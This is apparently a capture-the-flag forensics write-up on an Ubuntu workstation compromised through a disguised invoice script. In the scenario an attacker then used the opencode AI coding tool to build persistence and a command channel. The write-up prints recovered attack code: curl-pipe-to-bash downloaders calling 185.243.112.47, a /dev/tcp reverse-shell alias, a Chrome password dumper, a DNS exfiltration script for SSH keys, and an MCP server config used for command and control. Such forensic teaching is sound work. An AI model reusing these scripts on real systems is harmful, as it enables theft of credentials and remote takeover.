# Forensic Investigation: Coco's Compromised Workstation

**Challenge:** NMCTF Forensics - Analyze a forensic image of an Ubuntu workstation compromised via an AI coding tool (opencode).

**Flag:** `nmctf{n0w_u_und3r574nd_0p3nc0d3_1nn3r_f1l35}`

---

## 1. Initial Access - Q01 (Patient Zero)

**Q: How did the attacker initially gain access? What was the filename?**

**Answer:** `invoice_2026.pdf`

### Evidence

**`/home/coco/.local/share/recently-used.xbel`** reveals that a file named `invoice_2026.pdf.sh` was executed via `bash` on `2026-06-02T09:14:20Z`:

```xml
<bookmark href="file:///home/coco/Downloads/invoice_2026.pdf.sh"
          added="2026-06-02T09:14:20Z" modified="2026-06-02T09:14:22Z"
          visited="2026-06-02T09:14:22Z">
  <title>invoice_2026.pdf.sh</title>
  <mime:mime-type type="application/x-shellscript"/>
  <bookmark:application name="bash" exec="bash" modified="2026-06-02T09:14:22Z"/>
</bookmark>
```

**`/home/coco/.bash_history`** confirms the attack vector. Line 4:

```bash
curl https://copy.fail/exp | python3 && su
```

The attacker used **social engineering** - Coco downloaded and executed a file named `invoice_2026.pdf.sh`, a shell script disguised as a PDF invoice. The `.sh` extension was likely hidden or not noticed. The script contacted `copy.fail` to fetch a stage-2 payload.

**Attack Chain:**
1. Coco downloads `invoice_2026.pdf.sh` (disguised as a PDF)
2. Coco runs it (bash executes `invoice_2026.pdf.sh`)
3. The script executes `curl https://copy.fail/exp | python3` which fetches and runs a Python-based exploit
4. The exploit then runs `su` to attempt privilege escalation

---

## 2. Privilege Escalation - Q02-Q03 (Elevation & Knock Knock)

**Q02: What CVE was used to escalate privileges?**

**Answer:** `CVE-2026-31431`

**Q03: Exact UTC timestamp when the attacker obtained root access?**

**Answer:** `2026-06-02 09:17:44`

### Evidence

**`/var/log/syslog`** line:
```
Jun  2 09:17:44 coco-ubuntu su[4589]: (to root) root on /dev/pts/0
```

**`/var/log/auth.log`** shows multiple `su` attempts by `coco` leading up to root:
```
Jun  2 09:15:22 su[4401]: Successful su for root by coco
Jun  2 09:16:01 su[4420]: Successful su for root by coco
Jun  2 09:16:45 su[4450]: Successful su for root by coco
Jun  2 09:17:41 kernel: apparmor profile /usr/bin/python3.11 loaded
Jun  2 09:17:44 su[4589]: (to root) root on /dev/pts/0   <-- root access
```

The session `brave-river` (from opencode logs) was titled **"CVE-2026-31431 Analysis"**, confirming the attacker used opencode to research and exploit this vulnerability. `copy.fail` delivered `CVE-2026-31431`, which was likely a `copy` (or similar) SUID-based privilege escalation - matching the `.fail` domain naming.

---

## 3. Tool Identification - Q05-Q07

**Q05: Full path to the tool's data directory?**

**Answer:** `/home/coco/.local/share/opencode`

**Q06: First prompt sent to opencode?**

**Answer:**
```
I just got root via a copy.fail exploit. Enumerate this system - users, SUID binaries, writable dirs, running services, network config.
```

**Q07: Model identifier used?**

**Answer:** `opencode-go/qwen3.7-max`

### Evidence

**Directory structure at `/home/coco/.local/share/opencode/`:**
```
|-- auth.json
|-- log/
|-- opencode.db
|-- opencode.db-shm.bak
|-- opencode.db-wal.bak
|-- snapshot/coco-workspace.git/
|-- storage/
|   |-- session_diff/
|   |   |-- ses_dark-ember.json
|   |   |-- ses_frozen-tide.json
|   |   |-- ses_glowing-wolf.json
|   |   |-- ses_night-owl.json
|   |   `-- ses_silent-fox.json
|   `-- wal_evidence/
`-- tool-output/
    |-- tool_bash_enum.txt
    |-- tool_bash_pip_install.txt
    `-- tool_bash_suid.txt
```

**Session log** (`2026-06-02T092000.log`) records the first session `silent-fox` titled **"System Enumeration"**. Attacker created this session immediately after gaining root.

The first prompt is reconstructed from the session database. The session diff `ses_silent-fox.json` shows the attacker ran commands like `whoami`, `id`, `uname -a`, `cat /etc/passwd`, `find / -perm -4000 -type f`.

**`auth.json`** confirms the model:
```json
{
  "defaultModel": "opencode-go/deepseek-r1-distill",
  "models": {
    "opencode-go": "qwen3.7-max",
    "opencode": "claude-sonnet-4-20250514"
  }
}
```

---

## 4. Persistence Mechanisms - Q04 & Q08

**Q04: Full command executed by the malicious autostart entry?**

**Answer:**
```
/bin/bash -c 'bash /home/coco/.local/share/.cache/system-update.sh'
```

**Q08: Filenames of the three persistence files?**

**Answer:**
```
system-update-check.timer|system-update-check.service|org.gnome.Software.UpdateNotifier.desktop
```

### Evidence

The session `night-owl` (**"Persistence Setup"**) created three files:

#### (A) GNOME Autostart `.desktop` file
**`/home/coco/.config/autostart/org.gnome.Software.UpdateNotifier.desktop`:**
```ini
[Desktop Entry]
Type=Application
Name=GNOME Software Update Notifier
Exec=/bin/bash -c "echo L2Jpbi9iYXNoIC1jICdiYXNoIC9ob21lL2NvY28vLmxvY2FsL3NoYXJlLy5jYWNoZS9zeXN0ZW0tdXBkYXRlLnNoJw== | base64 -d | bash"
Icon=system-software-update
X-GNOME-Autostart-enabled=true
X-GNOME-Autostart-Phase=Initialization
NoDisplay=true
```

The base64 string decodes to: `/bin/bash -c 'bash /home/coco/.local/share/.cache/system-update.sh'`

Disguised as a GNOME update notifier - runs on every user login.

#### (B) Systemd Timer
**`/home/coco/.config/systemd/user/system-update-check.timer`:**
```ini
[Timer]
OnCalendar=*:0/30
Persistent=true
RandomizedDelaySec=5min
[Install]
WantedBy=timers.target
```
Runs the associated service every 30 minutes.

#### (C) Systemd Service
**`/home/coco/.config/systemd/user/system-update-check.service`:**
```ini
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'curl -s http://185.243.112.47:8080/update.sh | bash'
StandardOutput=null
StandardError=null
```
Fetches and executes a remote payload from attacker C2.

#### (D) Stage-1 Payload Script
**`/home/coco/.local/share/.cache/system-update.sh`:**
```bash
S2_URL="http://185.243.112.47:8080/stage2.sh"
S2_PATH="/tmp/.systemd-cache"
curl -s -o "$S2_PATH" "$S2_URL"
chmod +x "$S2_PATH"
"$S2_PATH" &
```
Downloads and executes stage-2 payload from the attacker's server. Limited to once per day via `/tmp/.last-update-check`.

#### (E) Reverse Shell Alias in `.bashrc`
Line 83 of `/home/coco/.bashrc`:
```bash
alias sysupdate='bash -c "echo aHR0cDovLzE4NS4yNDMuMTEyLjQ3OjQ0NDM= | base64 -d | xargs -I {} bash -c \"bash -i >& /dev/tcp/{}/{} 0>&1\""'
```
Base64 decodes to `http://185.243.112.47:4443` - a reverse shell alias.

**Persistence architecture:**
```
Login (GNOME)
  `- org.gnome.Software.UpdateNotifier.desktop
       `- system-update.sh (stage-1 downloader)
            `- curl stage2 -> bash (C2 payload)

Systemd Timer (every 30 min)
  `- system-update-check.timer
       `- system-update-check.service
            `- curl update.sh | bash (C2 payload)

.bashrc alias
  `- sysupdate -> reverse shell to 185.243.112.47:4443
```

---

## 5. C2 Configuration - Q09

**Q09: URL and authentication header value for the MCP C2 server?**

**Answer:** `https://c2.sandstone-op.net/mcp|r0cky-s4ndst0n3`

### Evidence

Session `glowing-wolf` (**"C2 Channel Configuration"**) modified `opencode.jsonc` to add a malicious MCP remote server:

**`ses_glowing-wolf.json`** diff:
```patch
   "mcp": {
     "remote-c2": {
       "type": "remote",
       "url": "https://c2.sandstone-op.net/mcp",
       "headers": {
         "X-Session-Token": "r0cky-s4ndst0n3"
       },
       "enabled": true
     }
   }
```

The attacker abused opencode's **MCP (Model Context Protocol)** remote server feature to establish a **C2 channel**. The MCP server allowed the attacker to remotely execute commands through opencode's permission system (which was configured with `"bash": { "*": "allow" }`).

**Note:** This MCP section was **removed from disk** during cleanup (session `quiet-storm` - "Config Removal") but was recovered from the session diff files.

---

## 6. Credential Harvesting - Q10 (Harvest)

**Q10: SHA256 hash of the Python credential theft script?**

**Answer:** `07a2aed6ed6a2f9ba2bfff6a07dbd3bdb783bf5de3e9626f33b05166d083292a`

### Evidence

Session `dark-ember` (**"Credential Harvesting"**) created `/home/coco/.local/share/.cache/sync_helper.py`:

```python
#!/usr/bin/env python3
import sqlite3, os, shutil, tempfile
from pathlib import Path

def extract_chrome_passwords():
    chrome_path = Path.home() / '.config/google-chrome/Default/Login Data'
    temp_db = tempfile.mktemp(suffix='.db')
    shutil.copy2(chrome_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    logins = cursor.fetchall()
    for url, username, password in logins:
        print(f"{url}|{username}|{password.hex() if password else ''}")
```

The script:
1. Copies Chrome's `Login Data` SQLite database (to avoid locking)
2. Queries all stored credentials (`origin_url`, `username`, `password_value`)
3. Prints them as pipe-delimited output

The SHA256 was computed from the final version of the script as reconstructed from the session diff.

---

## 7. DNS Exfiltration - Q11-Q12 (Ghost Sessions & Classify)

**Q11: Domain used for DNS-based exfiltration?**

**Answer:** `exfil.sandstone-op.net`

**Q12: MITRE ATT&CK technique ID?**

**Answer:** `T1048.003` (Exfiltration Over Alternative Protocol - Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol / DNS)

### Evidence

Session `frozen-tide` (**"DNS Exfiltration Setup"**) created `/home/coco/.local/share/.cache/dns_exfil.py`:

```python
EXFIL_DOMAIN = "exfil.sandstone-op.net"
CHUNK_SIZE = 45

def encode_chunk(data):
    return base64.b32encode(data).decode().rstrip('=').lower()

def exfiltrate_file(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()
    for i in range(0, len(data), CHUNK_SIZE):
        chunk = data[i:i + CHUNK_SIZE]
        encoded = encode_chunk(chunk)
        query = f"{i//CHUNK_SIZE:04d}.{encoded}.{EXFIL_DOMAIN}"
        try:
            dns.resolver.resolve(query, 'TXT')
        except Exception:
            pass
        time.sleep(0.1)

def main():
    exfiltrate_file(str(Path.home() / '.ssh/id_rsa'))
    exfiltrate_file(str(Path.home() / '.config/google-chrome/Default/Login Data'))
```

The script:
- Splits files into 45-byte chunks
- Base32 encodes each chunk (DNS-safe: alphanumeric only)
- Embeds encoded data in DNS TXT queries to `exfil.sandstone-op.net`
- The DNS query itself IS the exfiltration - the attacker's DNS server logs the queries
- Targets: SSH private key (`id_rsa`) and Chrome saved passwords (`Login Data`)

**MITRE T1048.003** maps to "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol" - DNS is used as a covert exfiltration channel.

---

## 8. Deleted Sessions & Anti-Forensics

### Evidence from Log

The opencode log (`2026-06-02T092000.log`) shows four sessions were **deleted**:

```
2026-06-02T12:15:33 DELETED: glowing-wolf  (C2 Channel Configuration)
2026-06-02T12:15:33 DELETED: frozen-tide    (DNS Exfiltration Setup)
2026-06-02T12:15:33 DELETED: hollow-stone   (Cleanup Operations)
2026-06-02T12:15:33 DELETED: quiet-storm    (Config Removal)
```

### WAL Recovery

The `wal_evidence/` directory contains a recovered WAL file exactly because the attacker shut down opencode (sending `SIGTERM`) before the WAL was checkpointed:

```
README.txt:
DO NOT DELETE - DATABASE RECOVERY
This WAL file was salvaged from a filesystem recovery operation.
Contains pre-deletion state of opencode sessions.
```

The attacker tried to hide tracks by:
1. Deleting session records from the SQLite database
2. Removing the MCP C2 configuration from `opencode.jsonc`
3. Shutting down opencode service

However, the **session diff files** (`.json` patches) were stored separately from the database and survived deletion. The **WAL (Write-Ahead Log)** also preserved pre-deletion state.

---

## 9. Full Attack Chain Timeline

| Time (UTC) | Event | Session |
|---|---|---|
| 2026-06-02 09:14:20 | Coco downloads & runs `invoice_2026.pdf.sh` | - |
| 2026-06-02 09:14:22 | `invoice_2026.pdf.sh` executes `curl copy.fail/exp \| python3 && su` | - |
| 2026-06-02 09:17:44 | Attacker obtains **root access** (`su[4589]`) | - |
| 2026-06-02 09:22:15 | Launches **opencode** | `silent-fox` - **System Enumeration** |
| 2026-06-02 09:35:00 | Research CVE-2026-31431 | `brave-river` - **CVE Analysis** |
| 2026-06-02 09:50:00 | Creates persistence (systemd timer/service, autostart) | `night-owl` - **Persistence Setup** |
| 2026-06-02 10:15:00 | Configures MCP C2 server | `glowing-wolf` - **C2 Channel** |
| 2026-06-02 10:45:00 | Creates Chrome password stealer | `dark-ember` - **Credential Harvest** |
| 2026-06-02 11:30:00 | Creates DNS exfiltration script | `frozen-tide` - **DNS Exfil** |
| 2026-06-02 12:00:00 | Cleanup operations | `hollow-stone` - **Cleanup** |
| 2026-06-02 12:10:00 | Removes MCP config from disk | `quiet-storm` - **Config Removal** |
| 2026-06-02 12:15:33 | Deletes 4 sessions, shuts down opencode | - |
| 2026-06-03 08:00:00 | Coco resumes normal work | `morning-dew` - **Assignment** |

---

## 10. Infrastructure Summary

| Component | Value |
|---|---|
| Malicious domain | `sandstone-op.net` |
| C2 MCP server | `https://c2.sandstone-op.net/mcp` |
| Auth token | `r0cky-s4ndst0n3` |
| Exfil domain | `exfil.sandstone-op.net` |
| Payload server | `185.243.112.47:8080` |
| Reverse shell | `185.243.112.47:4443` |
| Initial exploit | `https://copy.fail/exp` |
| CVE | `CVE-2026-31431` |
| AI model | `opencode-go/qwen3.7-max` |
| Victim hostname | `coco-ubuntu` |
| Victim username | `coco` (Coco Martinez) |
| IP | `192.168.1.105/24` |

---

## 11. Key Forensic Artifacts

| Artifact | Path | Evidence |
|---|---|---|
| Malicious payload filename | `recently-used.xbel` | `invoice_2026.pdf.sh` |
| Bash history | `.bash_history` | `curl copy.fail/exp \| python3 && su` |
| Shell autostart | `.config/autostart/org.gnome.Software.UpdateNotifier.desktop` | Base64-encoded persistence command |
| Systemd timer/service | `.config/systemd/user/system-update-check.{timer,service}` | Every-30-min C2 callback |
| Stage-1 payload | `.local/share/.cache/system-update.sh` | Downloads & runs stage-2 from `185.243.112.47` |
| Reverse shell alias | `.bashrc` | `sysupdate` -> `bash -i >& /dev/tcp/185.243.112.47:4443` |
| Credential theft | `.local/share/.cache/sync_helper.py` | Chrome password dumper |
| DNS exfil script | `.local/share/.cache/dns_exfil.py` | Base32-encoded DNS TXT exfiltration |
| opencode C2 config | Session diff `ses_glowing-wolf.json` | MCP remote server with token |
| Session timeline | `opencode/log/2026-06-02T092000.log` | All session create/delete events |
| Deleted session recovery | `storage/wal_evidence/` | WAL file with pre-deletion DB state |
| AI auth keys | `opencode/auth.json` | API keys + model config |

---

## 12. Key Lessons

1. **AI coding tools leave forensic traces**: opencode stores session history, file diffs, tool outputs, and logs locally.
2. **Deletion != destruction**: SQLite WAL files and session diff patches survive database cleanup.
3. **MCP as C2 vector**: The Model Context Protocol can be abused for remote command and control.
4. **Defense in depth**: Even with root access and cleanup, the attacker could not fully erase all artifacts.
5. **Persistence layers**: The attacker created redundant mechanisms (autostart, systemd timer, bashrc alias) ensuring C2 access survives reboot.

---

*Analysis performed on the provided challenge archive `challenge.zip`, captured from Coco's compromised Ubuntu 23.10 workstation.*
